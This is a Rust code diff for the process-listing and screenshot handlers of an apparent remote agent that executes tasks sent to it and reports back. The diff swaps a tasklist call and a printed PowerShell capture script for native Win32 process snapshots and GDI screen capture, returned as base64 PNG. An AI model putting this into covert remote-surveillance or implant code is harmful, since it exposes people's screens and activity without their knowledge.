@@ -1,8 +1,6 @@
 //! System Operations - process list, screenshot handlers for built-in commands
 
-use crate::ops::decode_output;
 use crate::protocol::AgentMessage;
-use std::process::Command;
 use std::sync::mpsc::Sender;
 
 /// Check if a command is a built-in system operation
@@ -23,67 +21,143 @@ pub fn handle(task_id: &str, command: &str, sender: &Sender<AgentMessage>) {
 
 /// Handle `ps` command: list running processes
 fn handle_ps(task_id: &str, sender: &Sender<AgentMessage>) {
-    let output = Command::new("tasklist")
-        .args(["/FO", "CSV", "/NH"])
-        .output();
+    #[cfg(windows)]
+    {
+        use windows_sys::Win32::Foundation::CloseHandle;
+        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+        };
 
-    match output {
-        Ok(out) => {
-            let stdout = decode_output(&out.stdout);
-            let _ = sender.send(AgentMessage::TaskResult {
-                task_id: task_id.to_string(),
-                success: true,
-                output: stdout.trim().to_string(),
-            });
+        let mut result = String::new();
+        unsafe {
+            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if snapshot == -1 as isize {
+                let _ = sender.send(fail(task_id, "Failed to create process snapshot".to_string()));
+                return;
+            }
+
+            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
+            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+            if Process32FirstW(snapshot, &mut entry) != 0 {
+                loop {
+                    let name_end = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
+                    let name = String::from_utf16_lossy(&entry.szExeFile[..name_end]);
+                    result.push_str(&format!(
+                        "\"{}\",{},{}\n",
+                        name, entry.th32ProcessID, entry.cntThreads
+                    ));
+                    if Process32NextW(snapshot, &mut entry) == 0 {
+                        break;
+                    }
+                }
+            }
+
+            CloseHandle(snapshot);
         }
-        Err(e) => {
-            let _ = sender.send(fail(task_id, format!("ps failed: {e}")));
-        }
+
+        let _ = sender.send(AgentMessage::TaskResult {
+            task_id: task_id.to_string(),
+            success: true,
+            output: result.trim().to_string(),
+        });
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = sender.send(fail(task_id, "ps not supported on this platform".to_string()));
     }
 }
 
 /// Handle `screenshot` command: capture screen
 ///
-/// Uses PowerShell System.Drawing capture on Windows.
+/// Uses Win32 GDI to capture the screen and encodes as PNG.
 fn handle_screenshot(task_id: &str, sender: &Sender<AgentMessage>) {
-    // Use PowerShell to capture screenshot on Windows
-    let ps_script = r#"
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$screen = [System.Windows.Forms.Screen]::PrimaryScreen
-$bounds = $screen.Bounds
-$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-$graphics = [System.Drawing.Graphics]::FromImage($bmp)
-$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-$ms = New-Object System.IO.MemoryStream
-$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-[Convert]::ToBase64String($ms.ToArray())
-"#;
-
-    let output = Command::new("powershell")
-        .args(["-NoProfile", "-NonInteractive", "-Command", ps_script])
-        .output();
-
-    match output {
-        Ok(out) => {
-            if out.status.success() {
-                let b64 = decode_output(&out.stdout);
-                let b64 = b64.trim().to_string();
+    #[cfg(windows)]
+    {
+        let result = unsafe { capture_screen_to_png() };
+        match result {
+            Ok(png_data) => {
+                use base64::{engine::general_purpose::STANDARD, Engine as _};
+                let b64 = STANDARD.encode(&png_data);
                 let _ = sender.send(AgentMessage::TaskResult {
                     task_id: task_id.to_string(),
                     success: true,
                     output: b64,
                 });
-            } else {
-                let stderr = decode_output(&out.stderr);
-                let stderr = stderr.trim().to_string();
-                let _ = sender.send(fail(task_id, format!("screenshot failed: {stderr}")));
+            }
+            Err(e) => {
+                let _ = sender.send(fail(task_id, format!("screenshot failed: {e}")));
             }
         }
-        Err(e) => {
-            let _ = sender.send(fail(task_id, format!("screenshot failed: {e}")));
-        }
     }
+    #[cfg(not(windows))]
+    {
+        let _ = sender.send(fail(task_id, "screenshot not supported on this platform".to_string()));
+    }
+}
+
+#[cfg(windows)]
+unsafe fn capture_screen_to_png() -> Result<Vec<u8>, String> {
+    use windows_sys::Win32::Graphics::Gdi::*;
+    use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+
+    let width = GetSystemMetrics(SM_CXSCREEN);
+    let height = GetSystemMetrics(SM_CYSCREEN);
+    if width <= 0 || height <= 0 {
+        return Err("Invalid screen dimensions".to_string());
+    }
+
+    let hdc_screen = GetDC(std::ptr::null_mut());
+    let hdc_mem = CreateCompatibleDC(hdc_screen);
+    let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
+    let old_bmp = SelectObject(hdc_mem, hbitmap as *mut _);
+
+    BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
+
+    let mut bmi: BITMAPINFO = std::mem::zeroed();
+    bmi.bmiHeader.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
+    bmi.bmiHeader.biWidth = width;
+    bmi.bmiHeader.biHeight = -height; // top-down
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
+
+    let row_size = (width * 4) as usize;
+    let buf_size = row_size * height as usize;
+    let mut pixels: Vec<u8> = vec![0u8; buf_size];
+
+    GetDIBits(
+        hdc_mem, hbitmap, 0, height as u32,
+        pixels.as_mut_ptr() as *mut _,
+        &mut bmi, DIB_RGB_COLORS,
+    );
+
+    SelectObject(hdc_mem, old_bmp);
+    DeleteObject(hbitmap as *mut _);
+    DeleteDC(hdc_mem);
+    ReleaseDC(std::ptr::null_mut(), hdc_screen);
+
+    // Convert BGRA -> RGBA
+    for chunk in pixels.chunks_exact_mut(4) {
+        chunk.swap(0, 2);
+    }
+
+    encode_png(width as u32, height as u32, &pixels)
+}
+
+#[cfg(windows)]
+fn encode_png(width: u32, height: u32, rgba_data: &[u8]) -> Result<Vec<u8>, String> {
+    let mut buf = Vec::new();
+    {
+        let writer = std::io::BufWriter::new(&mut buf);
+        let mut encoder = png::Encoder::new(writer, width, height);
+        encoder.set_color(png::ColorType::Rgba);
+        encoder.set_depth(png::BitDepth::Eight);
+        let mut writer = encoder.write_header().map_err(|e| e.to_string())?;
+        writer.write_image_data(rgba_data).map_err(|e| e.to_string())?;
+    }
+    Ok(buf)
 }
 
 fn fail(task_id: &str, detail: String) -> AgentMessage {
